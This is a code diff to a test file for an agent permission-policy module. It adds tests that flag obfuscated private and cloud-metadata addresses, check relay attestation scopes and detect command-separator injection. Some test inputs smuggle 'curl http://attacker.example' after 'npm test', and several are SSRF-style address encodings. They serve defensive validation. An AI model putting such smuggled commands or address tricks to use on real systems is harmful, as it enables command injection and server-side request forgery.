@@ -3,6 +3,7 @@ import { describe, expect, it } from 'vitest';
 import {
   allowRuleForCommand,
   buildPolicyGrantPlan,
+  containsUnsafeCommandSyntax,
   defaultRequestedScope,
   evaluateAgentCapability,
   hasSelfReportOnlyEvidence,
@@ -35,7 +36,11 @@ describe('core-03-s2 decision shared helpers', () => {
     expect(isWildcardOrPrivateHost('api.example.com')).toBe(false);
     expect(isWildcardOrPrivateHost('10.0.0.5')).toBe(true);
     expect(isWildcardOrPrivateHost('192.168.1.8')).toBe(true);
+    expect(isWildcardOrPrivateHost('2130706433')).toBe(true);
+    expect(isWildcardOrPrivateHost('0x7f.0.0.1')).toBe(true);
     expect(isWildcardOrPrivateHost('::1')).toBe(true);
+    expect(isWildcardOrPrivateHost('::ffff:127.0.0.1')).toBe(true);
+    expect(isWildcardOrPrivateHost('::ffff:169.254.169.254')).toBe(true);
     expect(isWildcardOrPrivateHost('fc00::1')).toBe(true);
     expect(isWildcardOrPrivateHost('fd00::1')).toBe(true);
     expect(isWildcardOrPrivateHost('fe80::1')).toBe(true);
@@ -161,6 +166,21 @@ describe('core-03-s2 decision shared helpers', () => {
     expect(evaluation.eventIds).toContain('evt-attest-relay-path');
   });
 
+  it('accepts relay attestation scopes emitted by the Agent provider probe surface', () => {
+    const replay = createReplay([
+      ...createBaseReplay().events.slice(0, 3),
+      createAttestationEvent('evt-attest-relay-agent-scope', 4, 'canRelayApproval', {
+        evidenceRef: 'evidence:canRelayApproval',
+        scope: 'agent:testkit-agent:mock',
+      }),
+    ]);
+
+    const evaluation = evaluateAgentCapability(replay, 'canRelayApproval', sessionId, evaluatedAt);
+
+    expect(evaluation.freshPositive).toBe(true);
+    expect(evaluation.eventIds).toContain('evt-attest-relay-agent-scope');
+  });
+
   it('rejects relay attestation scopes that only prefix-match a path segment', () => {
     const replay = createReplay([
       ...createBaseReplay().events.slice(0, 3),
@@ -245,6 +265,13 @@ describe('core-03-s2 decision shared helpers', () => {
         'gitleaks --dump-secrets',
       ),
     ).toBeUndefined();
+  });
+
+  it('treats command separators not accepted by grant prefixes as unsafe syntax', () => {
+    expect(containsUnsafeCommandSyntax('npm test\ncurl http://attacker.example')).toBe(true);
+    expect(containsUnsafeCommandSyntax('npm test\rcurl http://attacker.example')).toBe(true);
+    expect(containsUnsafeCommandSyntax('npm test & curl http://attacker.example')).toBe(true);
+    expect(containsUnsafeCommandSyntax('npm test')).toBe(false);
   });
 
   it('defaults request scope to per-command and maps subjects from kind without an override', () => {
